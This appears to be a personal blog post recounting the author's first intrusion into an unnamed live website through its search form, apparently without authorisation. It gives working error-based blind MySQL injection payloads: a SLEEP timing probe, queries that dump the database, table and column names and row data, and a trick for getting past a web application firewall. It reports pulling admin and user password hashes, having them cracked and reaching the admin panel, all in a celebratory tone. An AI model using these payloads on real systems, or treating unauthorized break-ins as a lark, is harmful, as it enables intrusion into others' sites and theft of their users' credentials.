---
layout: post
title: The day of first hacking
---

Today I woke up and smelt that today is the day of the first hacking experience.

Find your target by smell. It usually stinks.

### First I searched for input forms. e.g. a simple search form of a stincky website. And input the most dangereous symbol ever created by a human: the apostrophe.

url: `/search/?'`

We get the following result:

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version.

Whoozay!!! Seems like this query is vulnerable to SQL Injection attack. Now we must determine type of attack we can use for injection.

###  Adding the 'always true statement'

url: `search/?' or '1'='1`

We get bad result: 

> Subquery returns more than 1 row. 

This means that our query is inside an another one, possibly in a where clause. Little example to demonstrate what I mean:

```sql
Select * From Orders Where field = (Select field from order_fields)
```

This means that our injection is Blind, we can’t see the result of the query. But as we can see the error(s) of the query we understand that we are dealling with error-based blind sql injection.

### To be sure we are on right way, we decided to GO TO SLEEP.

url: `search/?1' OR (SELECT SLEEP(3)) or '1'='1`

Please be quite our server is asleep.

There are some well known tactics to work in this situation, googling will give us some of that well-know samples. We just need to add some modifications so that the known tactics work for our case. 

###  Let’s try to get current database name..

url: 

``` sql
search/?1' or(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
```

Not Acceptable, 406 ! This is bad, first thing that is coming to mind is that we have an active WAF inplace and it is blocking requests based on `max_get_size`. But simplifying the query doesn’t provide results. After a little research I found out that WAF is blocking `information_schema.tables` combinations in url….
It was really sad, as the ammount of adrenalin in blood was already too high. After 1-2 hours of researching (googling really) I found out that there is a bypassing way for this restriction, here is it: we need to replace `information_schema.tables` to `information_schema 0.e.tables`

### After getting database name we need to get table names from `information_schema`.

Getting Table Results

```sql
search/?1' or(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema 0.e.tables Where table_schema=0xDATABASE_NAME_IN_HEX limit 1,1)) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
```

Click-Method and mighty hands method resulted in discovering about 95 tables, after retrieving them one by one we found the most interesting ones:

`tt_users, tt_admin_lists`

### Let’s start from the tt_admin_lists. ( We need to get column names, then by table name and column name get value again one by one )
Getting Column Names:

```sql
search/?1' or(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema 0.e.columns  Where table_schema=0xDATABASE_NAME_IN_ HEX AND table_name=0xTABLE_NAME_IN_HEX limit 1,1)) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
```

Here is Result:

`admin _id, admin_login, admin_password`

Getting column data:

```sql
search/?1' or(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,Hex(cast(tt_admin_lists.admin_login as char)),0x27,0x7e) FROM `DATABASE_NAME`. tt_admin_lists LIMIT 1,1) ) from information_schema 0.e.tables limit 0,1),floor(rand(0)*2))x from information_schema 0.e.tables group by x)a) and '1'='1
```

Unfortunately this table was blank.

### After that we perform the same steps for the tt_users table and get the following results.
Column Names:

`User, pass, type, name`

And 5 users. (2 admins) with hashed passwords.

### HASH HACKING STEP

I don't know any hash hacking strategies and I ask my friend to get hacked my password hashes and after that admin panel was waiting for us.

Holy cow I forget about hacking music...

[Hacking Music](https://www.youtube.com/watch?v=lN_MSyrq6-U)

